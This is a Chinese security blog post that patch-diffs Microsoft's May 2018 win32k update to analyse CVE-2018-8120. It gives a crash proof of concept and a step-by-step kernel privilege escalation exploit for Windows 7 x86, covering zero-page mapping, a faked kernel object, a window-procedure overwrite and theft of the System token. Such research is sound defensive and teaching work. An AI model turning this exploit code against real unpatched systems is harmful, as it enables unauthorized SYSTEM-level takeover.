> 原文链接: https://www.anquanke.com//post/id/145025 


# 通过对比 5 月补丁分析 win32k 空指针解引用漏洞


                                阅读量   
                                **130140**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01e65fcf5a9da6366a.png)](https://p1.ssl.qhimg.com/t01e65fcf5a9da6366a.png)

微软在 5 月安全公告中包含并修复了 4 个 win32k 内核提权漏洞。这篇文章将通过补丁对比的方式，发现并分析补丁程序中修复的一个由某处空指针解引用导致的提权漏洞，最终实现其验证和利用代码。分析和调试的过程将在 Windows 7 x86 SP1 基础环境的虚拟机中进行。

为防范利用该漏洞实施的攻击，正在使用 Windows 操作系统的用户必须尽快安装官方最新发布的安全补丁。



## 0x0 前言

这篇文章通过补丁对比的方式发现并分析 5 月补丁修复的一个在 `win32k` 内核模块中存在的空指针解引用导致的内核提权漏洞。根据 FortiGuard Labs 发布的信息，该漏洞正是 5 月补丁中修复的 CVE-2018-8120 漏洞。漏洞存在于内核函数 `SetImeInfoEx` 中，在未对目标窗口站 `tagWINDOWSTATION` 对象的指针成员域 `spklList` 指向地址进行有效性校验的情况下，函数对该地址直接进行读取访问。

窗口站 `tagWINDOWSTATION` 对象的指针成员域 `spklList` 存在指向 `NULL` 地址的可能性。如果用户进程创建指针成员域 `spklList` 指向 `NULL` 地址的窗口站对象，并将该窗口站与当前进程关联起来，在调用系统服务 `NtUserSetImeInfoEx` 设置输入法扩展信息的时候，内核函数 `SetImeInfoEx` 将访问位于用户进程地址空间中的零页内存；如果当前进程零页未被映射，函数的操作将引发缺页异常，导致系统 BSOD 的发生。

如果用户进程中的利用代码提前分配零页内存，使零页被映射，并构造位于零页中的伪造内核对象，将使内核函数误认为其中存储正确的键盘布局 `tagKL` 节点对象，实现任意地址写原语。利用实现的写原语覆盖特定内核对象的函数指针成员域，或修改代表内核态或用户态执行的相关标志位，继而实现任意代码执行的能力，最终实现内核提权。



## 0x1 补丁

通过将 5 月安全公告补丁程序中包含的 `win32k.sys` 模块文件和 4 月补丁程序中的文件进行对比，发现本次针对 `win32k.sys` 的更新主要修改了这些函数：

[![](https://p5.ssl.qhimg.com/t01996094c0e38affdb.png)](https://p5.ssl.qhimg.com/t01996094c0e38affdb.png)

通过对这些函数的修改逐个进行检查，注意到函数 `SetImeInfoEx` 的代码块改动：

[![](https://p1.ssl.qhimg.com/t0118644f03c706ceb7.png)](https://p1.ssl.qhimg.com/t0118644f03c706ceb7.png)

左侧是 5 月补丁文件中函数 `SetImeInfoEx` 的代码块跳转逻辑，右侧是 4 月更新中函数跳转逻辑。可以清楚地发现在更新后的函数起始位置存在新增的直接返回判断的代码块。更进一步地在 IDA 中观测该函数的细节：

补丁前：

```
if ( winSta )
  `{`
    pkl = winSta-&gt;spklList;
    while ( pkl-&gt;hkl != imeInfoEx-&gt;hkl )
    `{`
      pkl = pkl-&gt;pklNext;
      if ( pkl == winSta-&gt;spklList )
        return 0;
    `}`
    piiex = pkl-&gt;piiex;
    if ( !piiex )
      return 0;
    if ( !piiex-&gt;fLoadFlag )
      qmemcpy(piiex, imeInfoEx, sizeof(tagIMEINFOEX));
    bReturn = 1;
  `}`
  return bReturn;
```

补丁后：

```
if ( winSta &amp;&amp; (pklFirst = winSta-&gt;spklList) != 0 )
  `{`
    pkl = winSta-&gt;spklList;
    while ( pkl-&gt;hkl != imeInfoEx-&gt;hkl )
    `{`
      pkl = pkl-&gt;pklNext;
      if ( pkl == pklFirst )
        return 0;
    `}`
    piiex = pkl-&gt;piiex;
    if ( !piiex )
      return 0;
    if ( !piiex-&gt;fLoadFlag )
      qmemcpy(piiex, imeInfoEx, sizeof(tagIMEINFOEX));
    bReturn = 1;
  `}`
  else
  `{`
    bReturn = 0;
  `}`
  return bReturn;
```

通过对比两个代码片段，可发现补丁后的函数代码在函数开始的位置增加对成员域 `spklList` 值是否为 `0` 的校验，如果值为 `0` 则函数直接返回。无独有偶，本次更新修改函数列表中的函数 `ReorderKeyboardLayouts` 中也新增了对成员域 `spklList` 值是否为 `0` 的校验。因此有充分理由相信，这两处修补很可能修复了旧版本存在的空指针解引用的问题。



## 0x2 细节

根据前面的补丁对比可知，漏洞发生在函数 `SetImeInfoEx` 中。在 `win32k.sys` 模块中仅系统服务函数 `NtUserImeInfoEx` 存在对函数 `SetImeInfoEx` 的引用。系统服务函数 `NtUserImeInfoEx` 是操作系统提供的接口函数，用于将用户进程定义的输入法扩展信息对象设置在与当前进程关联的窗口站中的某个键盘布局节点对象中。

### <a class="reference-link" name="%E7%AA%97%E5%8F%A3%E7%AB%99"></a>窗口站

窗口站是与进程关联的安全对象，包含剪贴板、原子表、以及其他更多的桌面对象。窗口站对象在内核中以结构体 `tagWINDOWSTATION` 实例的形式存在：

```
kd&gt; dt win32k!tagWINDOWSTATION
   +0x000 dwSessionId      : Uint4B
   +0x004 rpwinstaNext     : Ptr32 tagWINDOWSTATION
   +0x008 rpdeskList       : Ptr32 tagDESKTOP
   +0x00c pTerm            : Ptr32 tagTERMINAL
   +0x010 dwWSF_Flags      : Uint4B
   +0x014 spklList         : Ptr32 tagKL
   +0x018 ptiClipLock      : Ptr32 tagTHREADINFO
   +0x01c ptiDrawingClipboard : Ptr32 tagTHREADINFO
   +0x020 spwndClipOpen    : Ptr32 tagWND
   +0x024 spwndClipViewer  : Ptr32 tagWND
   +0x028 spwndClipOwner   : Ptr32 tagWND
   +0x02c pClipBase        : Ptr32 tagCLIP
   +0x030 cNumClipFormats  : Uint4B
   +0x034 iClipSerialNumber : Uint4B
   +0x038 iClipSequenceNumber : Uint4B
   +0x03c spwndClipboardListener : Ptr32 tagWND
   +0x040 pGlobalAtomTable : Ptr32 Void
   +0x044 luidEndSession   : _LUID
   +0x04c luidUser         : _LUID
   +0x054 psidUser         : Ptr32 Void
```

其中的成员域 `spklList` 是指向关联的键盘布局 `tagKL` 对象链表首节点的指针。键盘布局 `tagKL` 结构体的定义如下：

```
kd&gt; dt win32k!tagKL
   +0x000 head             : _HEAD
   +0x008 pklNext          : Ptr32 tagKL
   +0x00c pklPrev          : Ptr32 tagKL
   +0x010 dwKL_Flags       : Uint4B
   +0x014 hkl              : Ptr32 HKL__
   +0x018 spkf             : Ptr32 tagKBDFILE
   +0x01c spkfPrimary      : Ptr32 tagKBDFILE
   +0x020 dwFontSigs       : Uint4B
   +0x024 iBaseCharset     : Uint4B
   +0x028 CodePage         : Uint2B
   +0x02a wchDiacritic     : Wchar
   +0x02c piiex            : Ptr32 tagIMEINFOEX
   +0x030 uNumTbl          : Uint4B
   +0x034 pspkfExtra       : Ptr32 Ptr32 tagKBDFILE
   +0x038 dwLastKbdType    : Uint4B
   +0x03c dwLastKbdSubType : Uint4B
   +0x040 dwKLID           : Uint4B
```

键盘布局结构体的成员域 `piiex` 指向关联的输入法扩展信息结构体对象。该成员域指向的对象将在函数 `SetImeInfoEx` 中被作为内存拷贝的目标地址。成员域 `pklNext` 和 `pklPrev` 作为指向后一个和前一个节点对象的指针，键盘布局对象链表将通过这两个指针成员域连接起来。

当某个窗口站对象被关联到指定进程时，其地址被存储在目标进程信息 `tagPROCESSINFO` 对象的成员域 `rpwinsta` 中。

进程默认关联的窗口站是由系统自动创建的交互式窗口站，其成员域 `spklList` 指向真实的键盘布局对象节点。当用户登录时，系统将交互式窗口站与用户登录会话关联起来；当第一次调用 USER32 或 GDI32 函数（除了窗口站和桌面函数）时，进程被自动建立和当前会话窗口站的连接。

当用户进程调用 `CreateWindowStation` 等函数创建新的窗口站时，最终在在内核中调用函数 `xxxCreateWindowStation` 执行窗口站创建的操作。在该函数执行期间，新的窗口站对象的成员域 `spklList` 并没有被初始化，将始终指向 `NULL` 地址。

### <a class="reference-link" name="SetImeInfoEx"></a>SetImeInfoEx

内核函数 `SetImeInfoEx` 用于将参数 `imeInfoEx` 指向的输入法扩展信息 `tagIMEINFOEX` 对象拷贝到目标键盘布局 `tagKL` 对象的成员域 `piiex` 指向的输入法信息对象缓冲区中。输入法扩展信息 `tagIMEINFOEX` 结构体的定义如下：

```
kd&gt; dt win32k!tagIMEINFOEX
   +0x000 hkl              : Ptr32 HKL__
   +0x004 ImeInfo          : tagIMEINFO
   +0x020 wszUIClass       : [16] Wchar
   +0x040 fdwInitConvMode  : Uint4B
   +0x044 fInitOpen        : Int4B
   +0x048 fLoadFlag        : Int4B
   +0x04c dwProdVersion    : Uint4B
   +0x050 dwImeWinVersion  : Uint4B
   +0x054 wszImeDescription : [50] Wchar
   +0x0b8 wszImeFile       : [80] Wchar
   +0x158 fSysWow64Only    : Pos 0, 1 Bit
   +0x158 fCUASLayer       : Pos 1, 1 Bit
```

在通过探针试探从参数传入的源输入法扩展信息 `tagIMEINFOEX` 对象内存地址之后，函数 `NtUserSetImeInfoEx` 通过调用函数 `_GetProcessWindowStation` 获取当前进程的窗口站对象指针，并将窗口站对象地址和从参数传入的源输入法扩展信息 `tagIMEINFOEX` 对象地址作为参数传入对函数 `SetImeInfoEx` 的调用。

```
if ( *(_BYTE *)gpsi &amp; 4 )
`{`
  ms_exc.registration.TryLevel = 0;
  v2 = imeInfoEx;
  if ( (unsigned int)imeInfoEx &gt;= W32UserProbeAddress )
    v2 = (tagIMEINFOEX *)W32UserProbeAddress;
  v3 = (char)v2-&gt;hkl;
  qmemcpy(&amp;v6, imeInfoEx, 0x15Cu);
  ms_exc.registration.TryLevel = -2;
  v4 = _GetProcessWindowStation(0);
  bReturn = SetImeInfoEx(v4, &amp;v6);
`}`
```

函数从参数 `winSta` 指向的窗口站对象中获取其成员域 `spklList` 指向的键盘布局链表的首节点地址。接下来函数从首节点开始遍历键盘布局对象链表，直到节点对象的成员域 `pklNext` 指回到首节点对象为止。函数判断每个被遍历的节点对象的成员域 `hkl` 是否与参数 `imeInfoEx` 指向的源输入法扩展信息对象的成员域 `hkl` 相等。这两个成员域都是类型为 `HKL` 的键盘布局对象句柄。

当匹配到相等的节点时，表示匹配成功。接下来函数判断目标键盘布局对象的成员域 `piiex` 是否指向真实的键盘布局对象缓冲区，且成员变量 `fLoadFlag` 值是否为 `FALSE`。如是，则成员域 `piiex` 指向的键盘布局对象缓冲区将作为目标地址，参数 `imeInfoEx` 指向的源输入法扩展信息对象的数据将被拷贝到目标地址中。

```
BOOL __stdcall SetImeInfoEx(tagWINDOWSTATION *winSta, tagIMEINFOEX *imeInfoEx)
`{`
  [...]
  if ( winSta )
  `{`
    pkl = winSta-&gt;spklList;
    while ( pkl-&gt;hkl != imeInfoEx-&gt;hkl )
    `{`
      pkl = pkl-&gt;pklNext;
      if ( pkl == winSta-&gt;spklList )
        return 0;
    `}`
    piiex = pkl-&gt;piiex;
    if ( !piiex )
      return 0;
    if ( !piiex-&gt;fLoadFlag )
      qmemcpy(piiex, imeInfoEx, sizeof(tagIMEINFOEX));
    bReturn = 1;
  `}`
  return bReturn;
`}`
```

根据前面补丁对比部分获得的信息，补丁程序在函数中增加对窗口站增加其成员域 `spklList` 是否为空的判断。这也就是说该成员域存在值为空的可能性。当其值为空时，函数在没有判断的情况下，直接读取零页数据。如果当前进程上下文不存在零页映射，那么函数将触发缺页异常，导致系统 BSOD 的发生。



## 0x3 触发

前面的部分分析了漏洞的细节，接下来根据已获得的条件尝试构造验证代码，以复现漏洞触发现场。

漏洞的触发需要进程关联成员域 `spklList` 指向空地址的窗口站对象。首先通过接口函数 `CreateWindowStation` 创建这样的窗口站，并通过调用函数 `SetProcessWindowStation` 将新创建的窗口站对象与当前进程关联起来。这最终在内核中使新的窗口站的地址被存储在当前进程的进程信息 `tagPROCESSINFO` 对象的成员域 `rpwinsta` 中。

```
SECURITY_ATTRIBUTES sa  = `{` 0 `}`;
sa.nLength              = sizeof(SECURITY_ATTRIBUTES);
sa.lpSecurityDescriptor = NULL;
sa.bInheritHandle       = TRUE;
hWinStat = CreateWindowStationW(NULL, CWF_CREATE_ONLY, WINSTA_ALL_ACCESS, &amp;sa);
SetProcessWindowStation(hWinStat);
```

新创建的窗口站对象的指针成员域 `spklList` 指向空地址：

```
kd&gt; dt win32k!tagWINDOWSTATION 85dfefa8
   +0x000 dwSessionId      : 1
   +0x004 rpwinstaNext     : (null)
   +0x008 rpdeskList       : (null)
   +0x00c pTerm            : 0x94b0eb80 tagTERMINAL
   +0x010 dwWSF_Flags      : 4
   +0x014 spklList         : (null)
   [...]
```

接下来需要在用户进程中调用系统服务函数 `NtUserSetImeInfoEx` 以使执行流在内核中进入 `SetImeInfoEx` 函数的调用。由于系统服务函数 `NtUserSetImeInfoEx` 没有在任何用户态的系统模块中导出，因此只能通过手动发起系统调用的方式调用。

```
BOOL __declspec(naked)
xxNtUserSetImeInfoEx(tagIMEINFOEX *imeInfoEx)
`{`
    __asm `{` mov eax, 1226h `}`;
    __asm `{` lea edx, [esp + 4] `}`;
    __asm `{` int 2eh `}`;
    __asm `{` ret `}`;
`}`
```

函数 `NtUserSetImeInfoEx` 只有一个参数，是指向源输入法扩展信息对象的指针。在用户进程中定义这样的源输入法扩展信息对象，并将地址传递给 `NtUserSetImeInfoEx` 函数的调用。

```
tagIMEINFOEX iiFaked  = `{` 0 `}`;
bReturn = xxNtUserSetImeInfoEx(&amp;iiFaked);
```

由于当前进程关联的窗口站对象的成员域 `spklList` 指向空地址，而空地址所在的零页内存此时并没有映射，因此当内核函数 `SetImeInfoEx` 在试图访问零页内存时，将触发访问违例的异常，导致系统 BSOD 的发生。

```
Access violation - code c0000005 (!!! second chance !!!)
win32k!SetImeInfoEx+0x17:
9490007c 395014          cmp     dword ptr [eax+14h],edx
kd&gt; r eax
eax=00000000
kd&gt; k
 # ChildEBP RetAddr
00 98a1ba90 9490003d win32k!SetImeInfoEx+0x17
01 98a1bc28 83e471ea win32k!NtUserSetImeInfoEx+0x65
02 98a1bc28 0016f2eb nt!KiFastCallEntry+0x12a
03 3378fbf4 0016f4c5 TempDemo!xxNtUserSetImeInfoEx+0xb
04 3378fdfc 0016f1ca TempDemo!xxTrackExploitEx+0x155
```



## 0x4 利用

前面的部分分析了漏洞的细节并构造了漏洞的验证代码。接下来将根据验证代码通过该漏洞实现内核提权的利用代码。

### <a class="reference-link" name="%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99%E7%9A%84%E5%AE%9E%E7%8E%B0"></a>任意地址写的实现

窗口站对象属于内核对象，通常情况下用户进程只能通过特定的接口函数极为有限地控制内核对象的成员数据。当某个内核对象的某些成员指针意外地指向空地址这样的位于用户地址空间的内存地址时，用户进程中的利用代码将能够通过分配这样的内存页并通过巧妙的内存布局实现更大范围地控制内核对象成员数据的能力。

在利用代码中首先分配基地址位于零页的内存块，以使零页完成映射。

```
PVOID  MemAddr  = (PVOID)1;
SIZE_T MemSize  = 0x1000;
NtAllocateVirtualMemory(GetCurrentProcess(),
    &amp;MemAddr,
    0,
    &amp;MemSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_READWRITE);
ZeroMemory(MemAddr, MemSize);
```

接下来构造零页中的数据使其满足函数 `SetImeInfoEx` 的访问逻辑。由于窗口站对象的成员域 `spklList` 指向的是 `tagKL` 类型的对象，因此在这里将 `NULL` 地址起始的内存块当作 `tagKL` 类型的内存对象，并初始化关键的几个成员域的值。

```
DWORD *klFaked = (DWORD *)0;
klFaked[0x02] = (DWORD)klFaked;     // tagKL-&gt;pklNext
klFaked[0x03] = (DWORD)klFaked;     // tagKL-&gt;pklPrev
klFaked[0x05] = (DWORD)iiFaked.hkl; // tagKL-&gt;hkl
klFaked[0x0B] = (DWORD)0xCCCCCCCC;  // tagKL-&gt;piiex
```

函数 `SetImeInfoEx` 通过键盘布局节点对象的指针成员域 `pklNext` 作为索引遍历链表，并根据成员域 `hkl` 进行匹配，因此将该成员域初始化为首节点对象的指针，及当前伪造的键盘布局对象所在的 `NULL` 地址，并将成员域 `hkl` 初始化成与源输入法扩展信息 `tagIMEINFOEX` 对象的成员域 `hkl` 相同的值。

当匹配的键盘布局节点对象被找到之后，函数 `SetImeInfoEx` 将向目标键盘布局对象的指针成员域 `piiex` 指向的缓冲区中写入通过参数从用户进程中传入的源输入法信息 `tagIMEINFOEX` 对象中的数据，实现任意内存地址写原语。

### <a class="reference-link" name="%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AE%9E%E7%8E%B0"></a>任意代码执行的实现

内核提权最常见的方法是将当前进程的 `EPROCESS` 对象的指针成员域 `Token` 替换为系统进程的 `Token` 指针。然而到目前为止实现了任意内存地址写原语，却没有实现任意地址读原语，致使替换进程 `Token` 指针操作的难度增加。

可以利用任意地址写原语，将某内核对象的函数指针成员域替换为位于用户进程地址空间中由利用代码实现的函数的地址，并修改代表内核态或用户态执行的相关标志位，进而使该对象在处理相关事件时，在内核中直接执行到位于用户进程地址空间中的函数代码，并在该函数中最终实现内核提权。在本分析中通过替换目标窗口对象的消息处理函数指针成员域 `lpfnWndProc` 来实现。

接下来实现的大致思路是：创建普通窗口对象，将该窗口对象的成员数据填充到源输入法扩展信息 `tagIMEINFOEX` 对象中，置位其中的成员标志位 `bServerSideWindowProc` 并修改指针成员域 `lpfnWndProc` 的值；再使位于零页的伪造键盘布局 `tagKL` 对象的成员域 `piiex` 指向目标窗口对象的内核地址，将位于源输入法扩展信息对象中的被修改过的窗口对象成员数据覆盖到目标窗口对象的内存块中，实现对目标窗口对象的特定成员域的修改。

[![](https://p2.ssl.qhimg.com/t01702eb653b5e12d49.png)](https://p2.ssl.qhimg.com/t01702eb653b5e12d49.png)

首先创建普通的窗口对象作为利用目标窗口对象。根据前面的分析，函数 `SetImeInfoEx` 在执行内存拷贝时是以 `tagIMEINFOEX` 对象的大小作为拷贝范围的。根据分析得知，输入法扩展信息 `tagIMEINFOEX` 对象的大小是 `0x15C` 字节，这远超窗口 `tagWND` 对象的 `0xB0` 字节大小。因此为避免执行内存拷贝时越界访问到后续的无关内存区域中，在注册窗口类时指定足够的扩展区域大小，以使最终分配的目标窗口对象的总大小超过 `0x15C` 字节。

```
WNDCLASSEXW wc    = `{` 0 `}`;
wc.cbSize         = sizeof(WNDCLASSEXW);
wc.lpfnWndProc    = DefWindowProcW;
wc.cbWndExtra     = 0x100;
wc.hInstance      = GetModuleHandleA(NULL);
wc.lpszMenuName   = NULL;
wc.lpszClassName  = L"WNDCLASSHUNT";
RegisterClassExW(&amp;wc);
hwndHunt = CreateWindowExW(WS_EX_LEFT, L"WNDCLASSHUNT",
    NULL,
    WS_VISIBLE,
    0,
    0,
    0,
    0,
    NULL,
    NULL,
    GetModuleHandleA(NULL),
    NULL);
```

接下来通过 `HMValidateHandle` 内核对象地址泄露技术获取创建的目标窗口对象的用户态映射地址和内核地址。关于这种内核对象地址泄露技术的详细信息可参考位于“链接”章节的相关文献。

从获取到的用户态映射地址的内存中拷贝 `tagIMEINFOEX` 结构体大小的数据到利用代码定义的源输入法扩展信息对象中。获取到的窗口对象内核地址将作为位于零页的伪造键盘布局对象的成员域 `piiex` 指向的内存地址。

```
PTHRDESKHEAD head = (PTHRDESKHEAD)xxHMValidateHandle(hwndHunt);
pwndHunt = head-&gt;pSelf;
CopyMemory(&amp;iiFaked, (PBYTE)head, sizeof(tagIMEINFOEX));

DWORD *klFaked = (DWORD *)0;
klFaked[0x02] = (DWORD)klFaked;     // tagKL-&gt;pklNext
klFaked[0x03] = (DWORD)klFaked;     // tagKL-&gt;pklPrev
klFaked[0x05] = (DWORD)iiFaked.hkl; // tagKL-&gt;hkl
klFaked[0x0B] = (DWORD)pwndHunt;    // tagKL-&gt;piiex
```

与输入法扩展信息 `tagIMEINFOEX` 对象的成员域 `hkl` 对应的窗口 `tagWND` 对象的成员域正好是其中存储的窗口对象句柄。

接下来修改位于源输入法扩展信息对象中的窗口对象成员数据，置位其中的成员标志位 `bServerSideWindowProc` 并修改指针成员域 `lpfnWndProc` 的值。

```
*(DWORD *)((PBYTE)&amp;iiFaked + 0x14) |= (DWORD)0x40000;          //-&gt;bServerSideWindowProc
*(DWORD *)((PBYTE)&amp;iiFaked + 0x60) = (DWORD)xxPayloadWindProc; //-&gt;lpfnWndProc
```

这样一来，当后续的对系统服务 `NtUserSetImeInfoEx` 的调用被执行时，将使位于源输入法扩展信息对象中的被修改过的窗口对象成员数据覆盖到目标窗口对象的内存块中。接下来再向目标窗口对象发送消息时，内核函数 `xxxSendMessageTimeout` 将根据置位的成员标志位 `bServerSideWindowProc` 直接在内核上下文执行自定义的 `xxPayloadWindProc` 消息处理函数。

### <a class="reference-link" name="%E4%BA%8B%E6%83%85%E5%B9%B6%E4%B8%8D%E6%80%BB%E6%98%AF%E6%8C%89%E8%AE%A1%E5%88%92%E5%8F%91%E5%B1%95"></a>事情并不总是按计划发展

但是当我在测试环境执行编译后的利用程序时，却发现并没有像预期的那样使目标窗口对象的关键成员域被修改。通过检查发现，内核函数在 `0x946d009a` 地址执行条件转移指令直接跳过了后续的拷贝操作：

```
win32k!SetImeInfoEx+0x31:
946d0096 83784800        cmp     dword ptr [eax+48h],0
946d009a 7509            jne     win32k!SetImeInfoEx+0x40 (946d00a5)  Branch

win32k!SetImeInfoEx+0x37:
946d009c 57              push    edi
946d009d 6a57            push    57h
946d009f 59              pop     ecx
946d00a0 8bf8            mov     edi,eax
946d00a2 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
946d00a4 5f              pop     edi

win32k!SetImeInfoEx+0x40:
946d00a5 33c0            xor     eax,eax
946d00a7 40              inc     eax
```

此处的条件转移指令用于判断位于目标输入法扩展信息 `tagIMEINFOEX` 对象 `+0x48` 字节偏移位置的成员域 `fLoadFlag` 的值，当该成员域值为 `FALSE` 时，函数才会执行后续的拷贝操作。

伪造的键盘布局 `tagKL` 对象的成员域 `piiex` 指向的是目标窗口对象的内核地址，该窗口对象 `+0x48` 字节偏移位置的成员域是成员结构体 `tagRECT rcWindow` 的子域 `right`，值不为零。

```
kd&gt; dt win32k!tagWND -d rcWindow
   +0x040 rcWindow : tagRECT
kd&gt; ? poi(poi(0x0+0x2c)+0x48)
Evaluate expression: 132 = 00000084
kd&gt; dt win32k!tagRECT poi(0x0+0x2c)+0x40
   +0x000 left             : 0n0
   +0x004 top              : 0n0
   +0x008 right            : 0n132
   +0x00c bottom           : 0n38
```

成员域 `rcWindow` 用于指定当前窗口对象矩形区域的坐标。其中子域 `left` 和 `top` 根据创建窗口对象时传入的参数 `X` 和 `Y` 而始终保持为 `0` 值；但无论当传入参数 `nWidth` 和 `nHeight` 设置何值都不能使子域 `right` 和 `bottom` 坐标值置零。

曾考虑使拷贝的区域基地址向前或向后稍微偏移，使作为目标的输入法扩展信息对象的成员域 `fLoadFlag` 正好能对应值为 `0` 的位置。但如果选择向后偏移，下一个值为 `0` 的位置在 `+0x20` 字节偏移处，如果内存拷贝从 `tagWND` 对象 `+0x20` 字节偏移位置开始拷贝，则将成员标志位 `bServerSideWindowProc` 置于拷贝范围之外，使该标志位无法在拷贝期间置位，因此不能成行。

通过用户进程创建的普通窗口对象在内核中被分配在进程关联的桌面堆中，而通过 `HMValidateHandle` 地址泄露技术获得的用户态映射是位于用户地址空间的桌面堆内存块的地址，两个地址是同一堆内存块的不同映射，内存块首地址之前 `8` 字节的位置是 `HEAP_ENTRY` 类型的头部结构。如果使拷贝的基地址向前偏移 `8` 字节，将使目标输入法扩展信息对象的成员域 `fLoadFlag` 对应窗口对象的成员结构体 `rcWindow` 的子域 `left`，这样将能够确保在函数 `SetImeInfoEx` 判断成员域 `fLoadFlag` 数值时顺利通过校验。但是这种方案增加了计算成本，始终不是最佳方案。

通过研究窗口创建的参数发现，当向 `CreateWindowEx` 函数调用传递的参数 `dwStyle` 值为 `WS_CLIPCHILDREN | WS_CLIPSIBLINGS | WS_POPUP` 时，新创建的窗口对象将不包含任何边框，其矩形区域顶点坐标均能够被设置为 `0` 数值。通过这种方案将不需进行拷贝范围的向前偏移。

```
kd&gt; ? poi(poi(0x0+0x2c)+0x48)
Evaluate expression: 0 = 00000000
kd&gt; dt win32k!tagRECT poi(0x0+0x2c)+0x40
   +0x000 left             : 0n0
   +0x004 top              : 0n0
   +0x008 right            : 0n0
   +0x00c bottom           : 0n0
```

### <a class="reference-link" name="%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E7%9A%84%E5%AE%9E%E7%8E%B0"></a>内核提权的实现

在将目标窗口对象的成员标志位 `bServerSideWindowProc` 置位、并将其窗口对象的消息处理函数成员域修改为用户进程自定义的消息处理函数地址之后，当用户进程向该窗口对象发送消息时，系统将在内核中直接进入目标消息处理函数中执行消息处理的任务。

在自定义的消息处理函数中，根据参数 `pwnd` 指向的当前窗口对象获取关联的线程信息 `tagTHREADINFO` 对象，并最终定位到当前进程的 `EPROCESS` 对象的地址。再根据 `EPROCESS` 链表定位到 System 进程的 `EPROCESS` 对象地址，获取其指针成员域 `Token` 的值，并将数值写入当前进程 `EPROCESS` 对象的成员域 `Token` 中。

接下来对 System 进程的目标 `Token` 对象指针引用计数进行自增，就大功告成了。当发送消息的函数返回到用户进程之后，创建新的命令提示符进程。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b4e59f90405b7d57.png)

可以观测到新启动的命令提示符已属于 System 用户身份。



## 后记

根据安全公告中的信息，该漏洞发生在 Windows 7 SP1 和 Windows Server 2008 版本的操作系统中。这是由于从 Windows 8 开始，微软在新版本的操作系统引入新的缓解措施，使用户进程无法分配零页内存，这类漏洞在新系统中将无法成功利用。

截止本文章发表时间为止，VirusTotal 平台上已出现被多家反病毒厂商报毒为 CVE-2018-8120 利用的样本文件出现。

[![](https://p3.ssl.qhimg.com/t013c04d92dd256eda2.png)](https://p3.ssl.qhimg.com/t013c04d92dd256eda2.png)

因此为防范利用该漏洞实施的攻击，确保不受该漏洞利用的影响，正在使用 Windows 7 操作系统的用户必须尽快安装官方最新发布的安全补丁。



## 0x5 链接

[1] MS.Windows.Win32k.NtUserSetImeInfoEx.Privilege.Escalation

[https://fortiguard.com/encyclopedia/ips/46028](https://fortiguard.com/encyclopedia/ips/46028)

[2] Window Stations

[https://msdn.microsoft.com/en-us/library/windows/desktop/ms687096(v=vs.85).aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/ms687096(v=vs.85).aspx)

[3] 对 UAF 漏洞 CVE-2015-2546 的分析和利用

[https://xiaodaozhi.com/exploit/122.html](https://xiaodaozhi.com/exploit/122.html)

[4] sam-b/windows_kernel_address_leaks

[https://github.com/sam-b/windows_kernel_address_leaks](https://github.com/sam-b/windows_kernel_address_leaks)

[5] Mitigating the Exploitation of Vulnerabilities that Allow Diverting Kernel Execution Flow in Windows

[https://securityintelligence.com/exploitation-vulnerabilities-allow-diverting-kernel-execution-flow-windows/](https://securityintelligence.com/exploitation-vulnerabilities-allow-diverting-kernel-execution-flow-windows/)

[6] Window Styles

[https://msdn.microsoft.com/zh-CN/library/windows/desktop/ms632600(v=vs.85).aspx](https://msdn.microsoft.com/zh-CN/library/windows/desktop/ms632600(v=vs.85).aspx)
